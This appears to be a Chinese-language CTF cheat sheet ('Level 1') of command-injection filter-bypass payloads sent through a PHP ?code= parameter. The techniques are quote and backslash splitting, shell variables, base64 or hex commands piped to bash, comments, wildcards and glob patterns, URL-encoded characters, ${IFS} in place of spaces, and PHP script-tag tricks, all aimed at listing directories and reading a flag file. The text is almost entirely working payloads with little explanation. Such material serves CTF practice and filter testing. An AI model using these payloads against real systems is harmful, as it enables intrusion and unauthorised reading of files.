### Level 1
方法一：拼接绕过：
```
--反斜线
?code=print_r(`l\s /;ca\t /ffffffffffla\gafag`);
--单引号
?code=print_r(`l''s /;ca''t /ffffffffffla''gafag`);
--双引号
?code=print_r(`l""s /;ca""t /ffffffffffla""gafag`)
```

注意：我们的反斜线在我们字符串作为参数的时候拼接可能不是很好用，因此我们在字符串拼接的时候最好还是用双引号或者单引号来绕过。

方法二：利用变量绕过：
```
a=fl;b=ag;cat $a$b.php
```

方法三：利用 base 64 编码, hex 编码绕过：
```
cat (你要执行的指令进行base64编码)|base64 -d |bash;
cat (你要执行的指令的hex编码) |xxd -r -p |bash
```

方法四：插入注释（只适用于我们的命令，对于我们的参数不太可行）：
```
?code=print_r(`l/*test01*/s`);
```

方法五：通配符绕过 (只适用于我们的参数，不适用于我们的命令）：
```
?通配符
?code=print_r(`c""at /????????????????g`)

*通配符：
?code=print_r(`c""at /***************g`)

glob通配符绕过：
?code=print_r(`c""at /ffffffffffla{a,c,g}afag`);//挨个试
?code=print_r(`c""at%20/ffffffffffla[a-z]afag`);//有就试
```

方法八：过滤空格，问号等
我们如果过滤的字符是一个特殊字符，我们可以考虑找到这个二字符对应的 URL 编码，然后把我们的对应的 URL 编码写入到我们的对应当中：
```
? 
1.使用%3F绕过
2.如果我们是在php时使用的？，我们可以考虑用script标签绕过<script language='php'> system('ls /') </script>


空格 
1.%09,%0a,%0d
2.%20或者+
3. ${IFS}，$IFS$9,绕过，在Linux系统中，我们的${IFS}是一个环境变量，定义了字段分隔符。默认情况下，这个字段包括我们的空格，制表符，换行符
4. <,或者<>
5.{cat,flag.php}
；
1.通过?>来绕过我们的函数，然后再用<?开启一个新的函数
(）无法绕过，限制我们只能够调用
1.require
```
